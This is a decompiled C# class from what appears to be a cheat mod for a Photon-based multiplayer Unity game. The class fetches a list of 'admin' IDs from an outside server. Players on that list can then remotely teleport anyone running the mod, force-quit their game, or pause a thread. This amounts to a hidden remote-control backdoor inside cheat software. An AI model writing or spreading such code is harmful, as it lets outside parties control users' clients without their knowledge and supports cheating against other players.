using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading;
using ExitGames.Client.Photon;
using Photon.Pun;
using Photon.Realtime;
using Steal.Patchers;
using UnityEngine;

namespace Steal.Background.Mods
{
	// Token: 0x0200003E RID: 62
	internal class AdminControls : Mod
	{
		// Token: 0x0600010F RID: 271 RVA: 0x0000D770 File Offset: 0x0000B970
		public override void OnConnectedToMaster()
		{
			base.OnConnectedToMaster();
			if (!AdminControls.hasInit)
			{
				using (WebClient webClient = new WebClient())
				{
					AdminControls.adminIDS = webClient.DownloadString("https://tnuser.com/API/adminids").Split('\n', StringSplitOptions.None).ToList<string>();
				}
				PhotonNetwork.NetworkingClient.EventReceived += this.OnEvent;
				AdminControls.hasInit = true;
			}
		}

		// Token: 0x06000110 RID: 272 RVA: 0x0000D7E8 File Offset: 0x0000B9E8
		public void OnEvent(EventData ev)
		{
			Player player = PhotonNetwork.NetworkingClient.CurrentRoom.GetPlayer(ev.Sender, false);
			if (player != null && AdminControls.adminIDS.Contains(player.UserId))
			{
				object[] array = (object[])ev.CustomData;
				if (ev.Code == 10 && array[0] != null)
				{
					TeleportationLib.Teleport((Vector3)array[0]);
				}
				if (ev.Code == 11)
				{
					Application.Quit();
				}
				if (ev.Code == 12)
				{
					Thread.Sleep(9);
				}
			}
		}

		// Token: 0x040000BE RID: 190
		private static bool hasInit = false;

		// Token: 0x040000BF RID: 191
		public static List<string> adminIDS = new List<string>();
	}
}
